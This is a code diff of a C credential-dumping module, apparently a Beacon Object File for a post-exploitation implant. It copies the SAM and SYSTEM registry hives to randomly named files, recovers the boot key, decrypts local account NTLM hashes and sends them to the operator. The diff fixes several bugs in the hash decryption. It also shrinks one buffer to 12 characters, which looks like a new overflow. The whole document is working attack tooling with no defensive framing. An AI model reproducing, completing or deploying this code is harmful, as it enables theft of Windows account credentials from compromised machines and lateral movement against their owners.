@@ -1,10 +1,10 @@
 #include <stdio.h>
 #include <windows.h>
-#include "../_include/beacon.h"
-#include "../_include/bofdefs.h"
 #include "bofdefs.h"
 #include "hive_parser.c"
 #include <shlobj.h>
+#include "../_include/bofdefs.h"
+#include "../_include/beacon.h"
 
 const BYTE ODD_PARITY[] = {
     1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
@@ -33,33 +33,22 @@ BOOL DecryptDES(const BYTE *key, const BYTE *data, BYTE *output)
 
     NTSTATUS status = bcrypt$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_DES_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status))
-    {
         return FALSE;
-    }
 
-    status = bcrypt$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
-                                      (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
-                                      sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
-    if (!BCRYPT_SUCCESS(status))
-    {
+    status = bcrypt$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
+    if (!BCRYPT_SUCCESS(status)) {
         bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
-    status = bcrypt$BCryptGenerateSymmetricKey(hAlg, &hKey,
-                                               NULL, 0, (PUCHAR)key, 8, 0);
-    if (!BCRYPT_SUCCESS(status))
-    {
+    status = bcrypt$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 8, 0);
+    if (!BCRYPT_SUCCESS(status)) {
         bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
     DWORD cbResult = 0;
-    status = bcrypt$BCryptDecrypt(hKey,
-                                  (PUCHAR)data, 8,
-                                  NULL,
-                                  NULL, 0,
-                                  output, 8, &cbResult, 0);
+    status = bcrypt$BCryptDecrypt(hKey, (PUCHAR)data, 8, NULL, NULL, 0, output, 8, &cbResult, 0);
 
     result = BCRYPT_SUCCESS(status);
 
@@ -70,45 +59,30 @@ BOOL DecryptDES(const BYTE *key, const BYTE *data, BYTE *output)
 
 // Decrypt data using AES-CBC algorithm
 
-BOOL DecryptAES_CBC(
-    const BYTE *key,
-    DWORD keyLen,
-    const BYTE *iv,
-    DWORD ivLen,
-    const BYTE *encrypted,
-    DWORD encryptedLen,
-    BYTE **decryptedOut,
-    DWORD *decryptedOutLen)
+BOOL DecryptAES_CBC( const BYTE *key, DWORD keyLen,const BYTE *iv,DWORD ivLen, const BYTE *encrypted, DWORD encryptedLen, BYTE **decryptedOut, DWORD *decryptedOutLen)
 {
-
     BCRYPT_ALG_HANDLE hAlg = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
     BOOL result = FALSE;
 
     // Open AES algorithm provider
     NTSTATUS status = bcrypt$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
-    if (!BCRYPT_SUCCESS(status))
-    {
+    if (!BCRYPT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open AES algorithm provider\n");
         return FALSE;
     }
 
     // Set chaining mode to CBC
-    status = bcrypt$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
-                                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
-                                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-    if (!BCRYPT_SUCCESS(status))
-    {
+    status = bcrypt$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    if (!BCRYPT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to set chaining mode\n");
         bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
     // Generate symmetric key
-    status = bcrypt$BCryptGenerateSymmetricKey(hAlg, &hKey,
-                                               NULL, 0, (PUCHAR)key, keyLen, 0);
-    if (!BCRYPT_SUCCESS(status))
-    {
+    status = bcrypt$BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, keyLen, 0);
+    if (!BCRYPT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to generate symmetric key\n");
         bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
@@ -116,8 +90,7 @@ BOOL DecryptAES_CBC(
 
     // Allocate output buffer
     *decryptedOut = (BYTE *)AllocateMemory(encryptedLen);
-    if (!*decryptedOut)
-    {
+    if (!*decryptedOut) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to allocate memory for decrypted data\n");
         bcrypt$BCryptDestroyKey(hKey);
         bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
@@ -126,15 +99,8 @@ BOOL DecryptAES_CBC(
 
     // Decrypt
     DWORD decryptedSize = 0;
-    status = bcrypt$BCryptDecrypt(hKey,
-                                  (PUCHAR)encrypted, encryptedLen,
-                                  NULL,
-                                  (PUCHAR)iv, ivLen,
-                                  *decryptedOut, encryptedLen,
-                                  &decryptedSize, 0);
-
-    if (!BCRYPT_SUCCESS(status))
-    {
+    status = bcrypt$BCryptDecrypt(hKey, (PUCHAR)encrypted, encryptedLen, NULL, (PUCHAR)iv, ivLen, *decryptedOut, encryptedLen, &decryptedSize, 0);
+    if (!BCRYPT_SUCCESS(status)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Decryption failed\n");
         FreeMemory(*decryptedOut);
         *decryptedOut = NULL;
@@ -159,8 +125,7 @@ BOOL EnablePrivilege(LPCWSTR privilege)
     if (!Advapi32$OpenProcessToken(Kernel32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
         return FALSE;
 
-    if (!Advapi32$LookupPrivilegeValueA(NULL, privilege, &luid))
-    {
+    if (!Advapi32$LookupPrivilegeValueA(NULL, privilege, &luid)) {
         Kernel32$CloseHandle(hToken);
         return FALSE;
     }
@@ -169,8 +134,7 @@ BOOL EnablePrivilege(LPCWSTR privilege)
     tkp.Privileges[0].Luid = luid;
     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    if (!Advapi32$AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
-    {
+    if (!Advapi32$AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
         Kernel32$CloseHandle(hToken);
         return FALSE;
     }
@@ -186,12 +150,9 @@ DWORD GetCurrentControlSet(HKEY hSystem)
     DWORD controlSet = 1;
     DWORD type, value, size = sizeof(DWORD);
 
-    if (Advapi32$RegOpenKeyExA(hSystem, "Select", 0, KEY_READ, &hSelect) == ERROR_SUCCESS)
-    {
+    if (Advapi32$RegOpenKeyExA(hSystem, "Select", 0, KEY_READ, &hSelect) == ERROR_SUCCESS) {
         if (Advapi32$RegQueryValueExA(hSelect, "Current", NULL, &type, (LPBYTE)&value, &size) == ERROR_SUCCESS)
-        {
             controlSet = value;
-        }
         Advapi32$RegCloseKey(hSelect);
     }
     return controlSet;
@@ -205,8 +166,7 @@ BOOL GetBootKey(HKEY hSystem, LPCSTR lsaPath, BYTE *bootKey)
     DWORD size = sizeof(data);
     LONG res;
 
-    if (Advapi32$RegOpenKeyExA(hSystem, lsaPath, 0, KEY_READ, &hLsa) != ERROR_SUCCESS)
-    {
+    if (Advapi32$RegOpenKeyExA(hSystem, lsaPath, 0, KEY_READ, &hLsa) != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open key");
         return FALSE;
     }
@@ -224,21 +184,18 @@ BOOL GetBootKey(HKEY hSystem, LPCSTR lsaPath, BYTE *bootKey)
         DWORD classValueSize = sizeof(classValue) / 2;
 
         res = Advapi32$RegOpenKeyW(hLsa, values[i], &hKey);
-        if (res != ERROR_SUCCESS)
-        {
+        if (res != ERROR_SUCCESS) {
             BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open key");
             return FALSE;
         }
-        if (Advapi32$RegQueryInfoKeyW(hKey, classValue, &classValueSize, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
-        {
+        if (Advapi32$RegQueryInfoKeyW(hKey, classValue, &classValueSize, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
             BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to read class");
             return FALSE;
         }
         Advapi32$RegCloseKey(hKey);
 
         // Decode the bootkey hex strings
-        for (size_t j = 0; j < classValueSize / 2; ++j)
-        {
+        for (size_t j = 0; j < classValueSize / 2; ++j) {
             MSVCRT$swscanf_s(classValue + j * 2, L"%2hhx", bootKeyParts + i * 4 + j);
         }
     }
@@ -252,15 +209,14 @@ BOOL GetBootKey(HKEY hSystem, LPCSTR lsaPath, BYTE *bootKey)
 }
 
 // Global pointers for backup paths
-char *systemBackupPath = NULL;
-char *samBackupPath = NULL;
+char* systemBackupPath __attribute__((section (".data"))) = 0;
+char* samBackupPath __attribute__((section (".data"))) = 0;
 
 // Generate random alphanumeric string
 void GenerateRandomString(char *buffer, size_t length)
 {
     const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    for (size_t i = 0; i < length; ++i)
-    {
+    for (size_t i = 0; i < length; ++i) {
         buffer[i] = charset[MSVCRT$rand() % (sizeof(charset) - 1)];
     }
     buffer[length] = '\0';
@@ -274,9 +230,7 @@ void InitializeBackupPaths()
     char basePath[MAX_PATH];
     // Get AppData\Local path
     if (!SUCCEEDED(Shell32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, basePath)))
-    {
         MSVCRT$strcpy_s(basePath, MAX_PATH, "C:\\temp"); // Fallback
-    }
 
     char randPart1[9], randPart2[9];
     GenerateRandomString(randPart1, 8); // 8-character random string
@@ -285,7 +239,6 @@ void InitializeBackupPaths()
     // Allocate and build paths
     systemBackupPath = (char *)AllocateMemory(MAX_PATH);
     samBackupPath = (char *)AllocateMemory(MAX_PATH);
-
     MSVCRT$sprintf_s(systemBackupPath, MAX_PATH, "%s\\%s", basePath, randPart1);
     MSVCRT$sprintf_s(samBackupPath, MAX_PATH, "%s\\%s", basePath, randPart2);
 }
@@ -299,19 +252,17 @@ void CleanupBackupPaths()
 
 void go()
 {
+
     InitializeBackupPaths();
     LONG res;
-
     const char *tempSystemKey = "BACKUP1";
 
-    if (!EnablePrivilege(SE_BACKUP_NAME))
-    {
+    if (!EnablePrivilege(SE_BACKUP_NAME)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to enable backup privileges. Are you local admin?");
         return;
     }
 
-    if (!EnablePrivilege(SE_RESTORE_NAME))
-    {
+    if (!EnablePrivilege(SE_RESTORE_NAME)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to enable restore privileges. Are you local admin?");
         return;
     }
@@ -320,15 +271,13 @@ void go()
     HKEY hSystem;
     HKEY hSam;
     res = Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0, KEY_READ, &hSystem);
-    if (res != ERROR_SUCCESS)
-    {
+    if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegOpenKeyExA failed: %d\n", res);
         return;
     }
 
     res = Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &hSam);
-    if (res != ERROR_SUCCESS)
-    {
+    if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegOpenKeyExA failed: %d\n", res);
         return;
     }
@@ -336,16 +285,14 @@ void go()
     // Save the hives to a files
     res = Advapi32$RegSaveKeyA(hSystem, systemBackupPath, NULL);
     Advapi32$RegCloseKey(hSystem);
-    if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS)
-    {
+    if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
         return;
     }
 
     res = Advapi32$RegSaveKeyA(hSam, samBackupPath, NULL);
     Advapi32$RegCloseKey(hSam);
-    if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS)
-    {
+    if (res != ERROR_SUCCESS && res != ERROR_ALREADY_EXISTS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegSaveKeyW failed: %d\n", res);
         return;
     }
@@ -354,8 +301,7 @@ void go()
 
     // Load backuped SYSTEM key
     res = Advapi32$RegLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey, systemBackupPath);
-    if (res != ERROR_SUCCESS)
-    {
+    if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] RegLoadKeyA failed: %d\n", res);
         return;
     }
@@ -363,8 +309,7 @@ void go()
     // Get current control set
     HKEY hSystemBak;
     res = Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "BACKUP1", 0, KEY_READ, &hSystemBak);
-    if (res != ERROR_SUCCESS)
-    {
+    if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to open SYSTEM backup key: %d\n", res);
         return;
     }
@@ -376,8 +321,7 @@ void go()
 
     // Extract boot key
     BYTE bootKey[16];
-    if (!GetBootKey(hSystemBak, lsaPath, bootKey))
-    {
+    if (!GetBootKey(hSystemBak, lsaPath, bootKey)) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to extract boot key");
         Advapi32$RegCloseKey(hSystemBak);
         return;
@@ -391,8 +335,7 @@ void go()
                  bootKey[12], bootKey[13], bootKey[14], bootKey[15]);
 
     res = Advapi32$RegUnLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey);
-    if (res != ERROR_SUCCESS)
-    {
+    if (res != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Failed to unload SYSTEM backup key: %d\n", res);
         return;
     }
@@ -542,8 +485,8 @@ void go()
         return;
     }
 
-    wchar_t *outputBuffer = (wchar_t *)AllocateMemory(offsetCount * 128 * sizeof(wchar_t)); // Size is only approximate, maybe fix it. However, 128 is big enough
-    MSVCRT$memset(outputBuffer, 0, offsetCount * 128 * sizeof(wchar_t));
+    wchar_t *outputBuffer = (wchar_t *)AllocateMemory((offsetCount * 128) * sizeof(wchar_t)); // Size is only approximate, maybe fix it. However, 128 is big enough
+    MSVCRT$memset(outputBuffer, 0,(offsetCount * 128) * sizeof(wchar_t));
     int bufferSize = 0;
 
     for (uint32_t i = 0; i < offsetCount; i++)
@@ -563,7 +506,6 @@ void go()
         }
 
         uint32_t rid = MSVCRT$strtoul(userKey.name, NULL, 16);
-        // BeaconPrintf(CALLBACK_OUTPUT, "RID: %d\n", rid);
 
         struct ValueEntry *values = parseValueList(file, userKey.valueListOffset, userKey.numValues, &valueCount);
         if (!values)
@@ -581,28 +523,22 @@ void go()
         for (uint32_t j = 0; j < valueCount; j++)
         {
             if (MSVCRT$strcmp(values[j].name, "V") == 0)
-            {
                 vdata = readHiveData(file, values[j].dataOffset, values[j].dataSize, &vdataSize);
-            }
             else if (MSVCRT$strcmp(values[j].name, "F") == 0)
-            {
                 fdata = readHiveData(file, values[j].dataOffset, values[j].dataSize, &fdataSize);
-            }
         }
 
         freeValueEntry(values);
         freeNkKey(&userKey);
 
-        if (!vdata || !fdata)
-        {
+        if (!vdata || !fdata) {
             FreeMemory(vdata);
             FreeMemory(fdata);
             continue;
         }
 
         // Read username
-        if (vdataSize <= 0xc + 4 + 4)
-        {
+        if (vdataSize <= 0xc + 4 + 4) {
             FreeMemory(vdata);
             FreeMemory(fdata);
             continue;
@@ -653,7 +589,7 @@ void go()
         if (hashLength <= 0x18)
         {
             // Empty hash - TODO lookup how secretsdump handles this guys
-            wchar_t *partBuffer = (wchar_t *)AllocateMemory(128 * sizeof(wchar_t));
+            wchar_t *partBuffer = (wchar_t *)AllocateMemory(12 * sizeof(wchar_t));
             if (partBuffer == NULL)
             {
                 BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Could not allocate buffer");
@@ -734,7 +670,7 @@ void go()
                 BYTE decrypted_hash[16];
 
                 DecryptDES(k1, encrypted_hash, decrypted_hash);
-                DecryptDES(k2, encrypted_hash, decrypted_hash + 0x8);
+                DecryptDES(k2, encrypted_hash + 8, decrypted_hash + 0x8);
 
                 wchar_t *partBuffer = (wchar_t *)AllocateMemory(128 * sizeof(wchar_t));
                 if (partBuffer == NULL)
@@ -746,16 +682,15 @@ void go()
                 MSVCRT$memset(partBuffer, 0, 128 * sizeof(wchar_t));
 
                 int partSize = MSVCRT$sprintf(partBuffer, "%ls:%d:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n", username, rid,
-                                              decrypted_hash[0], decrypted_hash[2], decrypted_hash[3], decrypted_hash[4],
-                                              decrypted_hash[5], decrypted_hash[6], decrypted_hash[7], decrypted_hash[8],
-                                              decrypted_hash[9], decrypted_hash[10], decrypted_hash[11], decrypted_hash[12],
-                                              decrypted_hash[13], decrypted_hash[14], decrypted_hash[15], decrypted_hash[16]);
+                                              decrypted_hash[0], decrypted_hash[1], decrypted_hash[2], decrypted_hash[3],
+                                              decrypted_hash[4], decrypted_hash[5], decrypted_hash[6], decrypted_hash[7],
+                                              decrypted_hash[8], decrypted_hash[9], decrypted_hash[10], decrypted_hash[11],
+                                              decrypted_hash[12], decrypted_hash[13], decrypted_hash[14], decrypted_hash[15]);
 
                 if (partSize != -1) {
-                    // This thing not works for non-english usernames, will need to find why we got -1 for it. swprintf makes Beacon die - need to debug
-                    MSVCRT$wcscat_s(outputBuffer, offsetCount * 128, partBuffer);
-                    bufferSize += partSize;
-                }
+                    BeaconOutput(CALLBACK_OUTPUT, partBuffer, partSize);
+                    FreeMemory(partBuffer);
+               }
 
                 FreeMemory(encrypted_hash);
             }
@@ -766,7 +701,6 @@ void go()
         FreeMemory(fdata);
     }
 
-    BeaconOutput(CALLBACK_OUTPUT, outputBuffer, bufferSize);
 
     MSVCRT$fclose(file);
     CleanupBackupPaths();
